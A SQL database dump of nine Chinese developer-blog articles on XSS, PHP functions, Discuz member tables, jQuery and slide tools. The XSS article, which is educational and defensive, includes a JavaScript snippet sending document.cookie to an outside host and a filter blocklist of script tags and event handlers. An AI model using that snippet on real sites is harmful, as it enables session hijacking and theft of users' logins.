INSERT INTO `np_article` (`id`,`title`,`seo_title`,`seo_keywords`,`seo_description`,`content`,`thumb`,`category_id`,`type_id`,`is_pass`,`is_com`,`is_top`,`is_hot`,`sort`,`hits`,`comment_count`,`username`,`origin`,`user_id`,`url`,`is_link`,`show_time`,`create_time`,`update_time`,`delete_time`,`access_id`,`lang`) VALUES ('1','XSS攻击与防范','','XSS跨站脚本攻击防范','XSS，跨站脚本攻击。为和层叠样式表区分开，跨站脚本在安全领域叫做“XSS”。恶意攻击者往Web页面里注入恶意Script代码，当用户浏览这些网页时，就会执行其中的恶意代码，可对用户进行盗取cookie信息、会话劫持等各种攻击。XSS是常见的Web攻击技术之一，由于跨站脚本漏洞易于出现且利用成本低，所以被OWASP列为当前的头号Web安全威胁。','&lt;p&gt;&lt;strong&gt;XSS(Cross Site Scripting)，跨站脚本攻击。&lt;/strong&gt;为和层叠样式表(Cascading Style Sheets，CSS)区分开，跨站脚本在安全领域叫做&amp;ldquo;XSS&amp;rdquo;。恶意攻击者往Web页面里注入恶意Script代码，当用户浏览这些网页时，就会执行其中的恶意代码，可对用户进行盗取cookie信息、会话劫持等各种攻击。XSS是常见的Web攻击技术之一，由于跨站脚本漏洞易于出现且利用成本低，所以被OWASP列为当前的头号Web安全威胁。&lt;/p&gt;

&lt;p&gt;XSS跨站脚本攻击本身对Web服务器没有直接的危害，它借助网站进行传播，使网站上大量用户受到攻击。攻击者一般通过留言、电子邮件或其他途径向受害者发送一个精心构造的恶意URL，当受害者在Web中打开该URL的时候，恶意脚本会在受害者的计算机上悄悄执行。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;根据XSS攻击的效果，可以将XSS分为3类：&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;(1) 反射型XSS(Non&amp;minus;persistent XSS)，服务器接受客户端的请求包，不会存储请求包的内容，只是简单的把用户输入的数据&amp;ldquo;反射&amp;rdquo;给浏览器。例如：www.a.com?xss.php?name=。访问这个链接则会弹出页面的cookie内容，若攻击者把alert改为一个精心构造的发送函数，就可以把用户的cookie偷走。&lt;/p&gt;

&lt;p&gt;(2) 存储型XSS(Persistent XSS)，这类XSS攻击会把用户输入的数据&amp;ldquo;存储&amp;rdquo;在服务器端，具有很强的稳定性。注入脚本跟反射型XSS大同小异，只是脚本不是通过浏览器&amp;agrave;服务器&amp;agrave;浏览器这样的反射方式，而是多发生在富文本编辑器、日志、留言、配置系统等数据库保存用户输入内容的业务场景。即用户的注入脚本保存到了数据库里，其他用户进行访问涉及到包含恶意脚本的链接都会中招。由于这段恶意的脚本被上传保存到了服务器，这种XSS攻击就叫做&amp;ldquo;存储型XSS&amp;rdquo;。&lt;/p&gt;

&lt;p&gt;例如：&lt;/p&gt;

&lt;p&gt;服务器端代码：&lt;/p&gt;

&lt;pre&gt;
$db.set(&amp;lsquo;name&amp;rsquo;, $_GET[&amp;lsquo;name&amp;rsquo;]);&lt;/pre&gt;

&lt;p&gt;HTML页面代码：&lt;/p&gt;

&lt;pre&gt;
echo &amp;lsquo;Hi,&amp;rsquo; . $db.get[&amp;lsquo;name&amp;rsquo;];&lt;/pre&gt;

&lt;p&gt;(3) DOM based XSS(Document Object Model XSS)，这类XSS攻击者将攻击脚本注入到DOM 结构里。出现该类攻击的大多原因是含JavaScrip静态HTML页面存在XSS漏洞。例如下面是一段存在DOM类型跨站脚本漏洞的代码：&lt;/p&gt;

&lt;p&gt;在JS中window.location.search是指URL中?之后的内容，document.write是将内容输出到页面。这时把链接换成http://localhost/test.php?default=&lt;/p&gt;

&lt;p&gt;那用户的cookie就被盗了。上面的例子只是很简单的一种，总结起来是使用了诸如document.write, innerHTML之类的渲染页面方法需要注意参数内容是否是可信任的。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;XSS攻击的危害，可以将XSS分为3类：&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;(1) 窃取用户信息。黑客可以利用跨站脚本漏洞盗取用户cookie而得到用户在该站点的身份权限。如在DOM树上新增图片，用户点击后会将当前cookie发送到黑客服务器：&lt;/p&gt;

&lt;pre&gt;
var i=document.createElement(&amp;ldquo;img&amp;rdquo;);
document.body.appendChild(i);
i.src = &amp;ldquo;http://www.niphp.com/?c=&amp;rdquo; + document.cookie;&lt;/pre&gt;

&lt;p&gt;(2) 劫持浏览器会话来执行恶意操作，如进行非法转账、强制发表日志或电子邮件等。&lt;/p&gt;

&lt;p&gt;(3) 强制弹广告页，刷流量和点击率。&lt;/p&gt;

&lt;p&gt;(4) 传播跨站脚本蠕虫。如著名的Samy (XSS)蠕虫攻击、新浪微博蠕虫攻击。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;对于XSS攻击，我们可以做如下防范：&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;(1) 输入过滤。永远不要相信用户的输入，对用户输入的数据做一定的过滤。如输入的数据是否符合预期的格式，比如日期格式，Email格式，电话号码格式等等。这样可以初步对XSS漏洞进行防御。&lt;/p&gt;

&lt;p&gt;上面的措施只在web端做了限制，攻击者通抓包工具如Fiddler还是可以绕过前端输入的限制，修改请求注入攻击脚本。因此，后台服务器需要在接收到用户输入的数据后，对特殊危险字符进行过滤或者转义处理，然后再存储到数据库中。&lt;/p&gt;

&lt;p&gt;(2) 输出编码。服务器端输出到浏览器的数据，可以使用系统的安全函数来进行编码或转义来防范XSS攻击。在PHP中，有htmlentities()和htmlspecialchars()两个函数可以满足安全要求。相应的JavaScript的编码方式可以使用JavascriptEncode。&lt;/p&gt;

&lt;p&gt;(3) 安全编码。开发需尽量避免Web客户端文档重写、重定向或其他敏感操作，同时要避免使用客户端数据，这些操作需尽量在服务器端使用动态页面来实现。&lt;/p&gt;

&lt;p&gt;(4) HttpOnly Cookie。预防XSS攻击窃取用户cookie最有效的防御手段。Web应用程序在设置cookie时，将其属性设为HttpOnly，就可以避免该网页的cookie被客户端恶意JavaScript窃取，保护用户cookie信息。&lt;/p&gt;

&lt;p&gt;(5)WAF(Web Application Firewall)，Web应用防火墙，主要的功能是防范诸如网页木马、XSS以及CSRF等常见的Web漏洞攻击。由第三方公司开发，在企业环境中深受欢迎。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;简单的XSS过虑方法&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;
$string_ = preg_replace(&amp;#39;/&amp;lt;?php(.&amp;lowast;?)?&amp;gt;/si&amp;#39;, &amp;#39;&amp;#39;, $string_);
$string_ = preg_replace(&amp;#39;/&amp;lt;?(.&amp;lowast;?)?&amp;gt;/si&amp;#39;, &amp;#39;&amp;#39;, $string_);
$string_ = preg_replace(&amp;#39;/&amp;lt;%(.&amp;lowast;?)%&amp;gt;/si&amp;#39;, &amp;#39;&amp;#39;, $string_);
$string_ = preg_replace(&amp;#39;/&amp;lt;?php&amp;brvbar;&amp;lt;?&amp;brvbar;?&amp;gt;&amp;brvbar;&amp;lt;%&amp;brvbar;%&amp;gt;/si&amp;#39;, &amp;#39;&amp;#39;, $string_);

$parm = array(&amp;#39;javascript&amp;#39;, &amp;#39;vbscript&amp;#39;, &amp;#39;expression&amp;#39;, &amp;#39;applet&amp;#39;, &amp;#39;meta&amp;#39;, &amp;#39;xml&amp;#39;,&amp;#39;blink&amp;#39;, &amp;#39;link&amp;#39;, &amp;#39;script&amp;#39;, &amp;#39;embed&amp;#39;, &amp;#39;object&amp;#39;, &amp;#39;iframe&amp;#39;, &amp;#39;frame&amp;#39;,&amp;#39;frameset&amp;#39;, &amp;#39;ilayer&amp;#39;, &amp;#39;layer&amp;#39;, &amp;#39;bgsound&amp;#39;, &amp;#39;title&amp;#39;, &amp;#39;base&amp;#39;);
foreach ($parm as $val) {
&amp;nbsp;&amp;nbsp; &amp;nbsp;$preg = &amp;#39;/&amp;lt;(&amp;#39; . $val . &amp;#39;.&amp;lowast;?)&amp;gt;(.&amp;lowast;?)&amp;lt;(/&amp;#39; . $val . &amp;#39;.&amp;lowast;?)&amp;gt;/si&amp;#39;;
&amp;nbsp;&amp;nbsp; &amp;nbsp;$string_ = preg_replace($preg, &amp;#39;&amp;#39;, $string_);
&amp;nbsp;&amp;nbsp; &amp;nbsp;$preg = &amp;#39;/&amp;lt;(/?&amp;#39; . $val . &amp;#39;.&amp;lowast;?)&amp;gt;/si&amp;#39;;
&amp;nbsp;&amp;nbsp; &amp;nbsp;$string_ = preg_replace($preg, &amp;#39;&amp;#39;, $string_);
}
$parm = array(&amp;#39;onabort&amp;#39;, &amp;#39;onactivate&amp;#39;, &amp;#39;onafterprint&amp;#39;, &amp;#39;onafterupdate&amp;#39;,&amp;#39;onbeforeactivate&amp;#39;, &amp;#39;onbeforecopy&amp;#39;, &amp;#39;onbeforecut&amp;#39;, &amp;#39;onbeforedeactivate&amp;#39;,&amp;#39;onbeforeeditfocus&amp;#39;, &amp;#39;onbeforepaste&amp;#39;, &amp;#39;onbeforeprint&amp;#39;, &amp;#39;onbeforeunload&amp;#39;,&amp;#39;onbeforeupdate&amp;#39;, &amp;#39;onblur&amp;#39;, &amp;#39;onbounce&amp;#39;, &amp;#39;oncellchange&amp;#39;, &amp;#39;onchange&amp;#39;,&amp;#39;onclick&amp;#39;, &amp;#39;oncontextmenu&amp;#39;, &amp;#39;oncontrolselect&amp;#39;, &amp;#39;oncopy&amp;#39;, &amp;#39;oncut&amp;#39;,&amp;#39;ondataavailable&amp;#39;, &amp;#39;ondatasetchanged&amp;#39;, &amp;#39;ondatasetcomplete&amp;#39;, &amp;#39;ondblclick&amp;#39;,&amp;#39;ondeactivate&amp;#39;, &amp;#39;ondrag&amp;#39;, &amp;#39;ondragend&amp;#39;, &amp;#39;ondragenter&amp;#39;, &amp;#39;ondragleave&amp;#39;,&amp;#39;ondragover&amp;#39;, &amp;#39;ondragstart&amp;#39;, &amp;#39;ondrop&amp;#39;, &amp;#39;onerror&amp;#39;, &amp;#39;onerrorupdate&amp;#39;,&amp;#39;onfilterchange&amp;#39;, &amp;#39;onfinish&amp;#39;, &amp;#39;onfocus&amp;#39;, &amp;#39;onfocusin&amp;#39;, &amp;#39;onfocusout&amp;#39;,&amp;#39;onhelp&amp;#39;, &amp;#39;onkeydown&amp;#39;, &amp;#39;onkeypress&amp;#39;, &amp;#39;onkeyup&amp;#39;, &amp;#39;onlayoutcomplete&amp;#39;,&amp;#39;onload&amp;#39;, &amp;#39;onlosecapture&amp;#39;, &amp;#39;onmousedown&amp;#39;, &amp;#39;onmouseenter&amp;#39;, &amp;#39;onmouseleave&amp;#39;,&amp;#39;onmousemove&amp;#39;, &amp;#39;onmouseout&amp;#39;, &amp;#39;onmouseover&amp;#39;, &amp;#39;onmouseup&amp;#39;, &amp;#39;onmousewheel&amp;#39;,&amp;#39;onmove&amp;#39;, &amp;#39;onmoveend&amp;#39;, &amp;#39;onmovestart&amp;#39;, &amp;#39;onpaste&amp;#39;, &amp;#39;onpropertychange&amp;#39;,&amp;#39;onreadystatechange&amp;#39;, &amp;#39;onreset&amp;#39;, &amp;#39;onresize&amp;#39;, &amp;#39;onresizeend&amp;#39;,&amp;#39;onresizestart&amp;#39;, &amp;#39;onrowenter&amp;#39;, &amp;#39;onrowexit&amp;#39;, &amp;#39;onrowsdelete&amp;#39;,&amp;#39;onrowsinserted&amp;#39;, &amp;#39;onscroll&amp;#39;, &amp;#39;onselect&amp;#39;, &amp;#39;onselectionchange&amp;#39;,&amp;#39;onselectstart&amp;#39;, &amp;#39;onstart&amp;#39;, &amp;#39;onstop&amp;#39;, &amp;#39;onsubmit&amp;#39;, &amp;#39;onunload&amp;#39;);
foreach ($parm as $val) {
&amp;nbsp;&amp;nbsp; &amp;nbsp;$preg = &amp;#39;/(&amp;#39; . $val . &amp;#39;.&amp;lowast;?)&amp;quot;(.&amp;lowast;?)&amp;quot;/si&amp;#39;;
&amp;nbsp;&amp;nbsp; &amp;nbsp;$string_ = preg_replace($preg, &amp;#39;&amp;#39;, $string_);
}
&lt;/pre&gt;','','3','0','1','0','0','0','0','71','0','','','1','','0','1471622400','1471657462','1471914773','0','0','zh-cn'),('2','微信公众平台开放改名：要求命名唯一 每年限一次','','微信公众号,微信公众平台','8月22日消息，前不久，微信悄然上线了个人公众号改名功能，今天，微信对公章账号也放开了改名权，不过改名后的公众账号需要符合命名唯一的条件，而且每个公众账号每年仅有一次改名机会。','&lt;p&gt;8月22日消息，前不久，微信悄然上线了个人公众号改名功能，今天，微信对公章账号也放开了改名权，不过改名后的公众账号需要符合命名唯一的条件，而且每个公众账号每年仅有一次改名机会。&lt;/p&gt;

&lt;p&gt;具体修改规则如下：&lt;/p&gt;

&lt;p&gt;账号主体为个人类的账号，可在扫码验证主体身份后进行修改。一年内仅可修改一次。(例：2016年1月1日至2016年12月31日内可修改一次名称)。&lt;/p&gt;

&lt;p&gt;账号主体为企业类、媒体类、政府类、其他组织类的账号，可通过微信认证方式验证主体身份后进行修改。修改的账号名称需遵循平台命名规则，符合平台命名唯一的前提;如名称含有特定关键词(如商标词)时需进一步补充提交资质。&lt;/p&gt;','','3','0','1','0','0','0','0','75','0','','','1','','0','1471968000','1471913346','1472008802','0','0','zh-cn'),('3','ecshop基本常用函数','ecshop基本常用函数','ecshop基本常用函数','ecshop基本常用函数和方法','&lt;p&gt;&lt;strong&gt;数据安全过虑，防止script攻击&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;
compile_str($string)&lt;/pre&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;检查文件类型&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;
check_file_type($filename, $realname=&amp;#39;&amp;#39;,&amp;nbsp;$limit_ext_types=&amp;#39;&amp;#39;)&lt;/pre&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;获取用户IP地址&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;
real_ip()&lt;/pre&gt;','','3','0','1','0','0','0','0','45','0','','','1','','0','0','1473213026','1474074771','0','0','zh-cn'),('4','php关于数字防注入,intval溢出,intval和2147483647问题解决方法','','','php关于数字防注入,intval溢出,intval和2147483647问题解决方法','&lt;p&gt;关于使用intval强制转换成数字的问题。数字大于2147483647会出现溢出出现负数。使用个方法来替代这个吧&lt;/p&gt;

&lt;pre&gt;
$n=&amp;quot;
&amp;quot;;
$a=2147483648.05555;
echo intval($a).$n; //result&amp;nbsp; -2147483648
echo (int) $a,$n;//result&amp;nbsp; -2147483648
echo floatval($a).$n;//result&amp;nbsp; 2147483648.0556
echo floor(floatval($a)).$n;//result&amp;nbsp; 2147483648&lt;/pre&gt;','','3','0','1','0','0','0','0','25','0','','','1','','0','0','1474075817','1474075998','0','0','zh-cn'),('5','DZ 会员注册与会员登录，没有用程序方法，直接写SQL语句','','','DZ 会员注册与会员登录，没有用程序方法，直接写SQL语句','&lt;p&gt;&lt;strong&gt;会员表:&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;
INSERT INTO pre_common_member (username, password, email, conisbind, timeoffset, regdate, groupid, avatarstatus) VALUES(&amp;#39;用户名&amp;#39;, &amp;#39;md5(md5(&amp;#39;123456&amp;#39;))真正的密码在UC表中&amp;#39;, &amp;#39;邮箱&amp;#39;, 1, 9999, time(), 10, 1)&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;会员统计表:&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;
INSERT INTO pre_common_member_count (uid) VALUES(&amp;#39;会员ID&amp;#39;)&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;会员资料表:&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;
INSERT INTO pre_common_member_profile (uid) VALUES(&amp;#39;会员ID&amp;#39;)&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;会员状态表:&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;
INSERT INTO pre_common_member_status (uid, regip, lastip, lastvisit, lastactivity) VALUES(&amp;#39;会员ID&amp;#39;,&amp;nbsp;&amp;#39;注册IP&amp;#39;, &amp;#39;登录IP&amp;#39;, &amp;#39;最后活动时间&amp;#39;)&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;UC会员表:&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;
INSERT INTO pre_ucenter_members (uid, username, password, email, regip, regdate, salt) VALUES(&amp;#39;会员ID&amp;#39;, &amp;#39;用户名&amp;#39;, &amp;#39;邮箱&amp;#39;, &amp;#39;注册IP&amp;#39;, &amp;#39;注册时间&amp;#39;, &amp;#39;佐料&amp;#39;)
INSERT INTO pre_ucenter_memberfields (uid) VALUES(&amp;#39;会员ID&amp;#39;)&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;会员登录&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;
require libfile(&amp;#39;function/member&amp;#39;);
require libfile(&amp;#39;class/member&amp;#39;);
setloginstatus(会员信息数组, $_GET[&amp;#39;cookietime&amp;#39;] ? 2592000 : 0);&lt;/pre&gt;','','3','0','1','0','0','0','0','22','0','','','1','','0','1474300800','1474360381','1474425933','0','0','zh-cn'),('6','PPT网页演示JS库','','','会议、演讲离不开幻灯片，它可以有效地辅助演讲者进行表达。目前一些流行的工具，比如Windows平台上的PowerPoint、Mac平台上的Keynote等工具，使得幻灯片的制作变得简单。但是这些幻灯片取决于特定的工具才能演示，且不利于传播。随着HTML5技术的发展，现在JavaScirpt也可以用来制作幻灯片，直接使用浏览器就可以播放，这样你只需给别人发一个链接即可。','&lt;p&gt;会议、演讲离不开幻灯片，它可以有效地辅助演讲者进行表达。目前一些流行的工具，比如Windows平台上的PowerPoint、Mac平台上的Keynote等工具，使得幻灯片的制作变得简单。但是这些幻灯片取决于特定的工具才能演示，且不利于传播。&amp;nbsp;&lt;/p&gt;

&lt;p&gt;随着HTML5技术的发展，现在JavaScirpt也可以用来制作幻灯片，直接使用浏览器就可以播放，这样你只需给别人发一个链接即可。&lt;/p&gt;

&lt;p&gt;如果你自己采用JavaScirpt来实现各种幻灯片效果，这是非常繁琐的。本文为你带来这款用于制作幻灯片的JavaScript库，可以使你的工作大大简化。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://lab.hakim.se/reveal-js/&quot; target=&quot;_blank&quot;&gt;&lt;img alt=&quot;&quot; src=&quot;./Uploads/images/201609/57e3aac5ecbc6.png&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://lab.hakim.se/reveal-js/&quot; target=&quot;_blank&quot;&gt;演示地址&lt;/a&gt;&amp;nbsp;&lt;a href=&quot;http://lab.hakim.se/reveal-js/&quot; target=&quot;_blank&quot;&gt;源码&lt;/a&gt;&amp;nbsp;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://slides.com/&quot; target=&quot;_blank&quot;&gt;&lt;img alt=&quot;&quot; src=&quot;./Uploads/images/201609/57e3ab80a157d.png&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://slides.com/&quot; target=&quot;_blank&quot;&gt;在线编辑器&lt;/a&gt;&lt;/p&gt;','','2','0','1','0','0','0','0','23','0','','','1','','0','0','1474538523','1475052246','0','0','zh-cn'),('7','PHP 大小写转换函数','','','PHP大小写转换函数包括有strtolower，strtoupper，ucfirst，ucwords等等函数，本文章来分别给各位介绍这几个字母大小写转换函数使用方法。','&lt;p&gt;1、将字符串转成小写&lt;/p&gt;

&lt;p&gt;该函数将传入的字符串参数所有的字符都转换成小写，并以小定形式放回这个字符串。&lt;/p&gt;

&lt;pre&gt;
strtolower();
echo strtolower(&amp;#39;Hello WORLD!&amp;#39;);&lt;/pre&gt;

&lt;p&gt;2、将字符串转成大写&lt;/p&gt;

&lt;p&gt;该函数的作用同strtolower函数相反，是将传入的字符参数的字符全部转换成大写，并以大写的形式返回这个字符串。&lt;/p&gt;

&lt;pre&gt;
strtoupper();
echo strtoupper(&amp;#39;Mary Had A Little Lamb and She LOVED It So&amp;#39;);&lt;/pre&gt;

&lt;p&gt;3、字符串首字符转成大写&lt;/p&gt;

&lt;p&gt;该函数的作用是将字符串的第一个字符改成大写，该函数返回首字符大写的字符串。&lt;/p&gt;

&lt;pre&gt;
ucfirst();=
echo ucfirst(&amp;#39;hello world!&amp;#39;);&lt;/pre&gt;

&lt;p&gt;4、字符串每个单词的首字符转成大写&lt;/p&gt;

&lt;p&gt;该函数将传入的字符串的每个单词的首字符变成大写.如&amp;quot;hello world&amp;quot;,经过该函数处理后,将返回&amp;quot;Hello Word&amp;quot;.&lt;/p&gt;

&lt;pre&gt;
ucwords();=
echo ucfirst(&amp;#39;hello world!&amp;#39;);&lt;/pre&gt;

&lt;p&gt;5、第一个词首字母小写&lt;/p&gt;

&lt;pre&gt;
lcfirst();
echo lcfirst(&amp;#39;HELLO WORLD!&amp;#39;);&lt;/pre&gt;','','3','0','1','0','0','0','0','8','1','','','1','','0','0','1474964849','1474964849','0','0','zh-cn'),('8','javascript与jquery常用函数与方法','','','javascript与jquery常用函数与方法','&lt;h1 style=&quot;text-align:center&quot;&gt;&lt;strong&gt;javascript&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;字符或数字转整数&lt;/p&gt;

&lt;pre&gt;
var num =&amp;nbsp;parseInt(&amp;#39;3.14&amp;#39;);&lt;/pre&gt;

&lt;p&gt;字符或数字转浮点数&lt;/p&gt;

&lt;pre&gt;
var num =&amp;nbsp;parseFloat(&amp;#39;314.15&amp;#39;);&lt;/pre&gt;

&lt;p&gt;字符转数组&lt;/p&gt;

&lt;pre&gt;
var array = str.split(&amp;quot;分割符 如:-或,&amp;quot;);&lt;/pre&gt;

&lt;h1 style=&quot;text-align:center&quot;&gt;&lt;strong&gt;jQuery&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;遍历所有元素(获得所有元素的值)&lt;/p&gt;

&lt;pre&gt;
var val = $(&amp;quot;#id option&amp;quot;).map(function(){return $(this).val();}).get();
var text = $(&amp;quot;#id option&amp;quot;).map(function(){return $(this).text();}).get();&lt;/pre&gt;

&lt;p&gt;删除元素&lt;/p&gt;

&lt;pre&gt;
$(&amp;quot;#id&amp;quot;).find(&amp;quot;option&amp;quot;).remove();
$(&amp;quot;#id option&amp;quot;).remove();
$(&amp;quot;#id&amp;quot;).nextAll().remove(); //删除指定元素后的所有元素&lt;/pre&gt;

&lt;p&gt;追加或添加元素&lt;/p&gt;

&lt;pre&gt;$(&amp;quot;#id&amp;quot;).append(&amp;quot;添加元素&amp;quot;);&lt;/pre&gt;

&lt;p&gt;获得元素的值或文本&lt;/p&gt;

&lt;pre&gt;
var val = $(&amp;quot;#id&amp;quot;).find(&amp;quot;option:selected&amp;quot;).val(); //获得选中的option值
var text = $(&amp;quot;#id&amp;quot;).find(&amp;quot;option:selected&amp;quot;).text(); //获得选中的option文本内容
var val = $(&amp;quot;#id&amp;quot;).val();
var text = $(&amp;quot;#id&amp;quot;).text();&lt;/pre&gt;','','2','0','1','0','0','0','0','10','0','','','1','','0','0','1474965758','1474965816','0','0','zh-cn'),('9','Touchshow 微演示 PPT/PDF 轻松发手机','','','PPT/PDF 轻松发手机，Touchshow微演示 -- 内容发布好工具','&lt;p&gt;啥都不说了都是泪，直接上图吧!&lt;/p&gt;

&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;./Uploads/images/201609/57eb816195772.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;上次找了个在线编辑的PPT网站，老板看不上不是他想要的。这次找到了这个，PPT上传直接转网页播放。可惜老板还是看不上，说要能在线编辑的。唉~~~~都是泪啊。。。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://ts.whytouch.com/index.php&quot; target=&quot;_blank&quot;&gt;官方网站&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;另:这是要收费的。比较这个我还是喜欢&lt;a href=&quot;http://www.niphp.com/index.php?m=home&amp;amp;c=index&amp;amp;a=article&amp;amp;cid=2&amp;amp;id=6&quot; target=&quot;_blank&quot;&gt;reveal-js&lt;/a&gt;&lt;/p&gt;','','2','0','1','0','0','0','0','2','0','','','1','','0','0','1475052165','1475052218','0','0','zh-cn');